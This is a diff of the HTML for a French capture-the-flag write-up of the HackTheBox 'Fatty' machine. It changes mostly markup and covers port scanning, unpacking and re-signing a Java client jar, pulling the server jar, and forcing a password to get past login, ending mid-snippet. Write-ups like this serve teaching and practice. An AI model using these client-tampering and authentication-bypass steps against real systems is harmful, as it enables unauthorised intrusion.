@@ -5,7 +5,7 @@
         <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
         <title>HackTheBox - Fatty Write-Up | La sécurité à la française</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="robots" content="noodp" />
-<meta name="Description" content="Driikolu, la sécurité à la française"><link rel="prev" href="/2020/03/install_arch_chiffre_uefi/" /><link rel="canonical" href="/2020/08/fatty-wu/" />
+<meta name="Description" content="Driikolu, la sécurité à la française"><link rel="prev" href="/2020/03/install_arch_chiffre_uefi/" /><link rel="next" href="/2022/04/word_worker_wu/" /><link rel="canonical" href="/2020/08/fatty-wu/" />
 <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
 <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -81,7 +81,7 @@ Trouver un point d&rsquo;entrée 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19
 <h1 id="trouver-un-point-dentrée">Trouver un point d&rsquo;entrée</h1>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -112,36 +112,36 @@ Trouver un point d&rsquo;entrée 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.174
-	Nmap scan report <span class="k">for</span> 10.10.10.174
-	Host is up <span class="o">(</span>0.039s latency<span class="o">)</span>.
-	Not shown: <span class="m">9996</span> closed ports
-	PORT     STATE SERVICE            VERSION
-	21/tcp   open  ftp                vsftpd 2.0.8 or later
-	22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
-	1337/tcp open  ssl/waste?
-	1338/tcp open  ssl/wmc-log-svc?
-	1339/tcp open  ssl/kjtsiteserver?
-	<span class="m">3</span> services unrecognized despite returning data. If you know the service/version, please 	submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-	<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
-	SF-Port1337-TCP:V<span class="o">=</span>7.80%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>4/4%Time<span class="o">=</span>5E88607F%P<span class="o">=</span>x86_64-unknown-linu
-	SF:x-gnu%r<span class="o">(</span>NULL,80,<span class="s2">&#34;\xe4\xdb\xb8\xe4_\x13\x96T\t\xf3r\xa7m\xc8h\x87\xc8\xf
-</span><span class="s2">	&lt;REDACTED&gt;
-</span><span class="s2">	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-</span><span class="s2">	SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu
-</span><span class="s2">	SF:x-gnu%r(NULL,80,&#34;</span>C<span class="se">\x</span>ec<span class="se">\&#34;</span>r<span class="se">\x</span>fd<span class="se">\x</span>89<span class="o">}</span><span class="se">\|\x</span>1d<span class="se">\x</span>ddW<span class="se">\x</span>1b<span class="se">\x</span>f8ux<span class="se">\x</span>f6<span class="se">\x</span>15B<span class="se">\x</span>f4<span class="se">\x</span><span class="m">9</span>
-	&lt;REDACTED&gt;
-	<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
-	SF-Port1339-TCP:V<span class="o">=</span>7.80%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>4/4%Time<span class="o">=</span>5E88607F%P<span class="o">=</span>x86_64-unknown-linu
-	SF:x-gnu%r<span class="o">(</span>NULL,80,<span class="s2">&#34;\&#34;\.\x0b\xb1\xcfd\x1a\xc3\x9c\xce\0\xd7\x982\xac\x99\x
-</span><span class="s2">	&lt;REDACTED&gt;
-</span><span class="s2">	Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A
-</span><span class="s2">	or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux
-</span><span class="s2">	3.16 	(94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%)
-</span><span class="s2">	No exact OS matches for host (test conditions non-ideal).
-</span><span class="s2">	Network Distance: 2 hops
-</span><span class="s2">	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.174
+</span></span><span class="line"><span class="cl">	Nmap scan report <span class="k">for</span> 10.10.10.174
+</span></span><span class="line"><span class="cl">	Host is up <span class="o">(</span>0.039s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">	Not shown: <span class="m">9996</span> closed ports
+</span></span><span class="line"><span class="cl">	PORT     STATE SERVICE            VERSION
+</span></span><span class="line"><span class="cl">	21/tcp   open  ftp                vsftpd 2.0.8 or later
+</span></span><span class="line"><span class="cl">	22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	1337/tcp open  ssl/waste?
+</span></span><span class="line"><span class="cl">	1338/tcp open  ssl/wmc-log-svc?
+</span></span><span class="line"><span class="cl">	1339/tcp open  ssl/kjtsiteserver?
+</span></span><span class="line"><span class="cl">	<span class="m">3</span> services unrecognized despite returning data. If you know the service/version, please 	submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">	<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+</span></span><span class="line"><span class="cl">	SF-Port1337-TCP:V<span class="o">=</span>7.80%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>4/4%Time<span class="o">=</span>5E88607F%P<span class="o">=</span>x86_64-unknown-linu
+</span></span><span class="line"><span class="cl">	SF:x-gnu%r<span class="o">(</span>NULL,80,<span class="s2">&#34;\xe4\xdb\xb8\xe4_\x13\x96T\t\xf3r\xa7m\xc8h\x87\xc8\xf
+</span></span></span><span class="line"><span class="cl"><span class="s2">	&lt;REDACTED&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span class="line"><span class="cl"><span class="s2">	SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu
+</span></span></span><span class="line"><span class="cl"><span class="s2">	SF:x-gnu%r(NULL,80,&#34;</span>C<span class="se">\x</span>ec<span class="se">\&#34;</span>r<span class="se">\x</span>fd<span class="se">\x</span>89<span class="o">}</span><span class="se">\|\x</span>1d<span class="se">\x</span>ddW<span class="se">\x</span>1b<span class="se">\x</span>f8ux<span class="se">\x</span>f6<span class="se">\x</span>15B<span class="se">\x</span>f4<span class="se">\x</span><span class="m">9</span>
+</span></span><span class="line"><span class="cl">	&lt;REDACTED&gt;
+</span></span><span class="line"><span class="cl">	<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+</span></span><span class="line"><span class="cl">	SF-Port1339-TCP:V<span class="o">=</span>7.80%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>4/4%Time<span class="o">=</span>5E88607F%P<span class="o">=</span>x86_64-unknown-linu
+</span></span><span class="line"><span class="cl">	SF:x-gnu%r<span class="o">(</span>NULL,80,<span class="s2">&#34;\&#34;\.\x0b\xb1\xcfd\x1a\xc3\x9c\xce\0\xd7\x982\xac\x99\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">	&lt;REDACTED&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">	Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A
+</span></span></span><span class="line"><span class="cl"><span class="s2">	or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux
+</span></span></span><span class="line"><span class="cl"><span class="s2">	3.16 	(94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%)
+</span></span></span><span class="line"><span class="cl"><span class="s2">	No exact OS matches for host (test conditions non-ideal).
+</span></span></span><span class="line"><span class="cl"><span class="s2">	Network Distance: 2 hops
+</span></span></span><span class="line"><span class="cl"><span class="s2">	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>On peut voir :</p>
 <ul>
@@ -195,11 +195,11 @@ qtc</p>
 <p>La première chose à faire c&rsquo;est d&rsquo;essayer d&rsquo;executer le client normalement. Pour cela, rien de plus simple !</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">java -jar fatty-client.jar
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java -jar fatty-client.jar
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_client_login.png" alt="Page de login du client jar" class="lazyload"><figcaption class="image-caption">Page de login du client jar</figcaption></figure></p>
 <p>On arrive sur une page de login, on test les identifiants donnés dans la 3ème note ( qtc / clarabibi ) et&hellip; Ça ne fonctionne pas. On obient un <em>Connection Error !</em></p>
@@ -209,69 +209,69 @@ qtc</p>
 <p>Basiquement, les jar ne sont que des archives de projet java.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">file fatty-client.jar
-	fatty-client.jar: Zip archive data, at least v2.0 to extract
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file fatty-client.jar
+</span></span><span class="line"><span class="cl">	fatty-client.jar: Zip archive data, at least v2.0 to extract
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Donc on va juste decompresser l&rsquo;archive et regarder son contenu.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">mkdir jar_content
-<span class="nb">cd</span> jar_content
-unzip ../fatty-client.jar
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir jar_content
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> jar_content
+</span></span><span class="line"><span class="cl">unzip ../fatty-client.jar
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On y trouve un fichier <strong>beans.xml</strong>, celui-ci sera utilisé par Spring pour la construction d&rsquo;objets. Ce fichier contient dans notre cas les informations de connexion au serveur :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;connectionContext&#34;</span> <span class="na">class =</span> <span class="s">&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span class="nt">&gt;</span>
-   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;0&#34;</span> <span class="na">value =</span> <span class="s">&#34;server.fatty.htb&#34;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;1&#34;</span> <span class="na">value =</span> <span class="s">&#34;8000&#34;</span><span class="nt">/&gt;</span>
-<span class="nt">&lt;/bean&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;connectionContext&#34;</span> <span class="na">class =</span> <span class="s">&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;0&#34;</span> <span class="na">value =</span> <span class="s">&#34;server.fatty.htb&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;1&#34;</span> <span class="na">value =</span> <span class="s">&#34;8000&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/bean&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Je vais donc tout simplement les modifier pour qu&rsquo;ils collent au serveur auquel je veux me connecter.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;connectionContext&#34;</span> <span class="na">class =</span> <span class="s">&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span class="nt">&gt;</span>
-   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;0&#34;</span> <span class="na">value =</span> <span class="s">&#34;10.10.10.174&#34;</span><span class="nt">/&gt;</span>
-   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;1&#34;</span> <span class="na">value =</span> <span class="s">&#34;1337&#34;</span><span class="nt">/&gt;</span>
-<span class="nt">&lt;/bean&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;connectionContext&#34;</span> <span class="na">class =</span> <span class="s">&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;0&#34;</span> <span class="na">value =</span> <span class="s">&#34;10.10.10.174&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;1&#34;</span> <span class="na">value =</span> <span class="s">&#34;1337&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/bean&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Ensuite, je n&rsquo;ai plus qu&rsquo;à recréer l&rsquo;archive et à l&rsquo;executer</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">zip -r ../modified-client.jar *
-<span class="nb">cd</span> ..
-java -jar modifier-client.jar
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip -r ../modified-client.jar *
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl">java -jar modifier-client.jar
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On retente la connexion avec les identifiants trouvés plus tôt et&hellip; On obtient une erreur.</p>
 <blockquote>
@@ -280,11 +280,11 @@ java -jar modifier-client.jar
 <p>En réalité, ce n&rsquo;est pas très grave. Le jar vérifie juste son intégrité via les signatures de fichiers et puisqu&rsquo;on a modifié <strong>beans.xml</strong>, sa signature a changé. On va donc supprimer les fichiers permettant cette vérification.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">zip -d modified-client.jar <span class="s1">&#39;META-INF/*.SF&#39;</span> <span class="s1">&#39;META-INF/*.RSA&#39;</span> <span class="s1">&#39;META-INF/*SF&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip -d modified-client.jar <span class="s1">&#39;META-INF/*.SF&#39;</span> <span class="s1">&#39;META-INF/*.RSA&#39;</span> <span class="s1">&#39;META-INF/*SF&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On relance le jar, et cette fois la connexion fonctionne \o/</p>
 <a class="post-dummy-target" id="obtenir-le-code-du-serveur"></a><h2>Obtenir le code du serveur</h2>
@@ -309,37 +309,37 @@ java -jar modifier-client.jar
 <p>On va tout simplement utiliser jd-gui pour récupérer l&rsquo;intégralité des fichiers sources du projet. Pour cela on ouvre le projet (le modifié afin de toujours avoir le beans.xml voulu).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">jd-gui modified-client.jar
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jd-gui modified-client.jar
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Puis on sauvegarde les sources (<em>File &gt; Save All Sources</em>).</p>
 <p>On obtient alors un magnifique zip que l&rsquo;on va décompresser.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">mkdir client_sources
-<span class="nb">cd</span> client_sources
-unzip ../modified-client_sources.zip
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir client_sources
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> client_sources
+</span></span><span class="line"><span class="cl">unzip ../modified-client_sources.zip
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Le dossier <em>org</em> contient apparemment des librairies importées. On va donc se concentrer sur le dossier <em>htb/fatty</em> qui a l&rsquo;air de contenir du code propre à notre client. On va donc dans ce dossier et on recherche les fonctions qui nous intéressent.</p>
 <p>Dans notre cas on veut voir comment le <em>File Browser</em> fonctionne, on va donc faire une recherche par rapport à certains mots clefs. Par exemple le mot clef <strong>configs</strong> qui correspond à l&rsquo;un des dossiers que l&rsquo;on peut explorer.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">grep -lR configs
-	client/gui/ClientGuiTest.java
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -lR configs
+</span></span><span class="line"><span class="cl">	client/gui/ClientGuiTest.java
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On fouille un peu le code java et on retrouve très vite la partie qui nous intéresse : Comment est configuré le dossier avec le <em>File Browser</em>.</p>
 <p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_filebrowser_code.png" alt="Code configuration dossier configs dans le File Browser" class="lazyload"><figcaption class="image-caption">Code configuration dossier configs dans le File Browser</figcaption></figure></p>
@@ -347,30 +347,30 @@ unzip ../modified-client_sources.zip
 <p>On retourne dans la racine des sources (ici <em>client_sources</em>) et on compile tout ça.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> ../..
-<span class="nb">shopt</span> -s globstar <span class="c1">#Pour faciliter la compilation juste après</span>
-javac **/*.java
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ../..
+</span></span><span class="line"><span class="cl"><span class="nb">shopt</span> -s globstar <span class="c1">#Pour faciliter la compilation juste après</span>
+</span></span><span class="line"><span class="cl">javac **/*.java
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Ici on a une erreur avec la compilation de spring ! Il suffit de récupérer le contenu déjà compilé que l&rsquo;on a décompressé tout à l&rsquo;heure.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">rm -rf org/
-cp -r ../jar_content/org/ .
-javac **/*.java
-zip -r ../modified-client.jar *
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm -rf org/
+</span></span><span class="line"><span class="cl">cp -r ../jar_content/org/ .
+</span></span><span class="line"><span class="cl">javac **/*.java
+</span></span><span class="line"><span class="cl">zip -r ../modified-client.jar *
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On relance le client, se connecte et va dans <em>File Browser &gt; Configs</em> et là&hellip; Le contenu affiché diffère de la dernière fois.</p>
 <p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_opt_fatty_content.png" alt="Contenu /opt/fatty" class="lazyload"><figcaption class="image-caption">Contenu /opt/fatty</figcaption></figure></p>
@@ -388,38 +388,38 @@ zip -r ../modified-client.jar *
 <p>On a donc rajouté les lignes suivantes</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="k">try</span> <span class="o">(</span><span class="n">FileOutputStream</span> <span class="n">fos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&#34;/tmp/fatty-server.jar&#34;</span><span class="o">))</span> <span class="o">{</span>
-	<span class="n">fos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">response</span><span class="o">.</span><span class="na">getContent</span><span class="o">());</span>			
-<span class="o">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">try</span> <span class="o">(</span><span class="n">FileOutputStream</span> <span class="n">fos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&#34;/tmp/fatty-server.jar&#34;</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">fos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">response</span><span class="o">.</span><span class="na">getContent</span><span class="o">());</span>			
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>En oubliant pas d&rsquo;importer les bibliothèques java nécessaires</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Donc à chaque fois que l&rsquo;on va utiliser <em>open</em>, le contenu de la réponse sera écrit dans ce fichier.</p>
 <p>On recompile, recréé le jar et on va utiliser la fonction <em>open</em> sur <em>fatty-server.jar</em>. Puis on regarde si le fichier a bien été créé.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">file /tmp/fatty-server.jar
-	/tmp/fatty-server.jar: Zip archive data, at least v1.0 to extract
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file /tmp/fatty-server.jar
+</span></span><span class="line"><span class="cl">	/tmp/fatty-server.jar: Zip archive data, at least v1.0 to extract
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Super ! On a plus qu&rsquo;à le récupérer et surtout&hellip; Récupérer ses sources, là encore avec <strong>jd-gui</strong>.</p>
 <p>Maintenant la question est&hellip; Qu&rsquo;est-ce qu&rsquo;on en fait ?</p>
@@ -442,11 +442,11 @@ zip -r ../modified-client.jar *
 <p>On va tout simplement modifier la dernière ligne de ce code par :</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">=</span> <span class="s">&#34;ABCD&#34;</span><span class="o">;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">=</span> <span class="s">&#34;ABCD&#34;</span><span class="o">;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On compile, recréé le jar et pour se connecter on met en guise de username :</p>
 <blockquote>
@@ -474,7 +474,7 @@ zip -r ../modified-client.jar *
 <p>On voit que lorsque l&rsquo;on appuie sur le bouton, le message &ldquo;<em>Not implemented yet.</em>&rdquo; est affiché dans tous les cas. On va supprimer l&rsquo;affichage de ce message et copier le fonctionnement des autre boutons pour appeler <em>changePW()</em>. On va donc mettre ce code (avec des valeurs &ldquo;poubelles&rdquo; dans l&rsquo;appel de la fonction puisqu&rsquo;on ne s&rsquo;en servira pas).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -485,55 +485,55 @@ zip -r ../modified-client.jar *
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="k">try</span> <span class="o">{</span>
-    <span class="n">ClientGuiTest</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">invoker</span><span class="o">.</span><span class="na">changePW</span><span class="o">(</span><span class="s">&#34;qtc&#34;</span><span class="o">,</span><span class="s">&#34;pouetpouet&#34;</span><span class="o">);</span>
